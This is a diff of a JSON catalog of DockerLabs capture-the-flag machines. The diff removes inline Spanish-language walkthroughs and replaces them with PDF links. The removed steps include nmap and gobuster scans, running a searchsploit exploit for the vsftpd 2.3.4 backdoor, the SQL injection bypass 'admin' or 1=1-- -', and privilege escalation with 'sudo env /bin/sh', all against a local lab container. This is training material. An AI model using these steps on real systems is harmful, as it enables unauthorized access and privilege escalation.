@@ -11,40 +11,7 @@
           "machine": "linux",
           "difficulty": "Fácil",
           "link": "https://dockerlabs.es/",
-          "solve": {
-            "id": 0,
-            "name": "First Hacking",
-            "step1": [
-              {
-                "step": "Procedemos a reconocer la máquina con un ping",
-                "command1": "ping -c 1 172.17.0.2"
-              }
-            ],
-            "step2": [
-              {
-                "step": "Hacemos un nmap para tener más información sobre esta máquina",
-                "command1": "nmap -p- -sC -sV --min-rate 5000 -vvv  --open -sS -n -Pn 172.17.0.2 -oN escaneo"
-              }
-            ],
-            "step3": [
-              {
-                "step": "Buscamos la vulnerabilidad con `searchsploit`",
-                "command1": "searchsploit vsftpd 2.3.4"
-              }
-            ],
-            "step4": [
-              {
-                "step": "Usamos python para este caso por lo que procedemos a guardar el script con este comando (el script esta en PATH):",
-                "command1": "searchsploit -m unix/remote/49757.py"
-              }
-            ],
-            "step5": [
-              {
-                "step": "Ejecutamos el script pasándole el host y listo!",
-                "command1": "python3 exploit.py 172.17.0.2"
-              }
-            ]
-          }
+          "solve": "./ctf/First Hacking - Hack FTP vuln.pdf"
         },
         {
           "id": "DL-002",
@@ -54,40 +21,7 @@
           "machine": "linux",
           "difficulty": "Fácil",
           "link": "https://dockerlabs.es/",
-          "solve": {
-            "id": 0,
-            "name": "Injection",
-            "step1": [
-              {
-                "step": "Intentamos acceder pero no nos dice mucho. Ahora procedemos con el escaneo de nmap",
-                "command1": "nmap -p- -sC -sV --open -sS -n -Pn 172.17.0.2 -oN escaneo"
-              }
-            ],
-            "step2": [
-              {
-                "step": "Ahora procedemos hacer el gobuster.",
-                "command1": "gobuster dir -u http://172.17.0.2/ -w /usr/share/dirb/wordlists/common.txt -x php,sh,py,txt"
-              }
-            ],
-            "step3": [
-              {
-                "step": "Al no tener más información procedemos a hacer una inyección sql para ver si podemos acceder al usuario. Introduciendo",
-                "command1": "admin' or 1=1-- -"
-              }
-            ],
-            "step4": [
-              {
-                "step": "Ahora escalaremos privilegios sabiendo el usuario.",
-                "command1": "ssh dylan@172.17.0.2"
-              }
-            ],
-            "step5": [
-              {
-                "step": "Vamos a explotarlo haciendo una búsqueda en [GTFOBins](https://gtfobins.github.io/gtfobins/env/)",
-                "command1": "sudo env /bin/sh"
-              }
-            ]
-          }
+          "solve": "./ctf/Injection - Inyección SQL.pdf"
         }
       ]
     },
@@ -102,15 +36,7 @@
           "machine": "windows",
           "difficulty": "Medio",
           "link": "#",
-          "solve": {
-            "id": 0,
-            "name": "FirstHack",
-            "step1": [{ "step": "Paso 1", "command1": "comando" }],
-            "step2": [{ "step": "Paso 2", "command1": "comando" }],
-            "step3": [{ "step": "Paso 3", "command1": "comando" }],
-            "step4": [{ "step": "Paso 4", "command1": "comando" }],
-            "step5": [{ "step": "Paso 5", "command1": "comando" }]
-          }
+          "solve": null
         }
       ]
     }
